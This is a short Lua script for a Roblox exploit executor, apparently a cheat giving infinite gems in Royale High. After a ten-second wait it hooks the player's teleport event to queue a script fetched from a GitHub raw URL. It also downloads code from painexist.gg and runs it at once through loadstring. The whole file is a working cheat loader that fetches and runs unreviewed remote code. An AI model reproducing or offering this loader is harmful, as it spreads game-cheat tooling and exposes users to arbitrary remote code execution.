print('start 10s')
wait(10)
print('10s up')
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        if syn~=nil then 
            syn.queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))
        else 
            queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/ImLvna/RBLXScripts/main/infiniteRoyalGems.lua', true))
        end
    end
end)
loadstring(game:HttpGet('https://painexist.gg/api/royalehigh.lua', true))()
